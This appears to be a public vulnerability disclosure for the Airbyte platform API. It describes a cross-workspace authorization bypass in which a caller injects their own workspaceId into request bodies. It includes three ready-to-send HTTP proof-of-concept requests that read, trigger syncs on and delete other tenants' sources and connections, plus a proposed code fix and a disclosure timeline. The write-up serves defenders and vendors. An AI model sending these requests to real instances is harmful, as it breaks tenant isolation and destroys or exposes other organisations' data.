https://github.com/airbytehq/airbyte-platform/

### Title: Cross-workspace IDOR via workspaceId injection in Airbyte Platform

### Details:
There's an authorization bypass in the airbyte-platform API server that allows any authenticated workspace member to operate on connections, sources, and destinations belonging to workspaces they do not have access to.

The issue is in how workspace context is resolved for authorization. The Netty-level `AuthorizationServerHandler` extracts every recognized field from the request body and sets corresponding `X-Airbyte-*` headers. `AuthenticationHeaderResolver.resolveWorkspace()` then checks these headers in priority order, with `X-Airbyte-Workspace-Id` first. Endpoints like `/connections/sync`, `/sources/delete`, and `/destinations/delete` use single-field DTOs (`ConnectionIdRequestBody`, `SourceIdRequestBody`, etc.), but the extractor works on the raw JSON body, not the DTO schema. This means any caller can inject a `workspaceId` field they control into these requests. The auth check resolves against their own workspace (which they have access to), while the handler uses the resource UUID they supplied -- with no secondary ownership verification.

### PoC

**Prerequisites**:
- Attacker user is a member of workspace A (any role from WORKSPACE_READER upward)
- Attacker knows the UUID of a resource (connection, source, or destination) in workspace B (a different workspace they do not have access to)

**Example 1: Read source config from another workspace (WORKSPACE_READER)**

```
POST /api/v1/sources/get HTTP/1.1
Host: <airbyte-host>
Authorization: Bearer <attacker-JWT>
Content-Type: application/json

{"sourceId":"<victim-source-uuid>","workspaceId":"<attacker-workspace-uuid>"}
```

Response: full source configuration including non-secret fields (hostname, database name, bucket name, etc.), with secrets replaced by `**********`.

**Example 2: Trigger sync on another workspace's connection (WORKSPACE_RUNNER)**

```
POST /api/v1/connections/sync HTTP/1.1
Host: <airbyte-host>
Authorization: Bearer <attacker-JWT>
Content-Type: application/json

{"connectionId":"<victim-connection-uuid>","workspaceId":"<attacker-workspace-uuid>"}
```

Response: `JobInfoRead` object for the newly triggered sync job against the victim connection.

**Example 3: Delete another workspace's source (WORKSPACE_EDITOR)**

```
POST /api/v1/sources/delete HTTP/1.1
Host: <airbyte-host>
Authorization: Bearer <attacker-JWT>
Content-Type: application/json

{"sourceId":"<victim-source-uuid>","workspaceId":"<attacker-workspace-uuid>"}
```

Response: HTTP 204 No Content. The source is deleted from the victim workspace.

**Proposed fix**

In each handler that receives a resource-scoped request (source, destination, connection), re-validate that the resolved resource belongs to the workspace the caller is authorized for. Alternatively, change `resolveWorkspace` to give resource-UUID-derived workspace priority over a client-supplied `workspaceId` when no `workspaceId` field is declared in the endpoint's DTO schema, or require the resolved resource workspace to match the supplied `workspaceId` before accepting the request.

A minimal code-level patch for `resolveWorkspace`:

```kotlin
// Current (vulnerable): workspaceId takes priority unconditionally
if (properties.containsKey(WORKSPACE_ID_HEADER)) {
    return listOf(UUID.fromString(properties[WORKSPACE_ID_HEADER]))
}

// Proposed: if a resource-scoped header is also present, verify the
// resource's workspace matches the supplied workspaceId instead of
// trusting the supplied value blindly.
if (properties.containsKey(WORKSPACE_ID_HEADER) && !hasResourceHeader(properties)) {
    return listOf(UUID.fromString(properties[WORKSPACE_ID_HEADER]))
}
// ... fall through to resource-derived workspace resolution
```

### Impact

Any workspace member (minimum WORKSPACE_READER) can read non-secret configuration fields from sources and destinations in any other workspace on the same Airbyte instance. Any workspace editor (WORKSPACE_EDITOR) can permanently delete connections, sources, and destinations belonging to other workspaces. Any workspace runner (WORKSPACE_RUNNER) can trigger, cancel, or reset syncs on connections they do not own.

This affects self-hosted multi-workspace deployments (e.g., multiple teams sharing one instance) and Airbyte Cloud, where workspaces enforce tenant isolation.


## Disclosure
 - 4 July 2026: reported via email
 - 25 August 2026: no response, no way to create github issue, disclosed here:

<img width="1301" height="493" alt="image" src="https://github.com/user-attachments/assets/637afc20-b833-4e43-9d08-dc472dbf98dc" />

<img width="870" height="137" alt="image" src="https://github.com/user-attachments/assets/95a7d304-56b1-42e9-899d-cd1b7e3aff1b" />

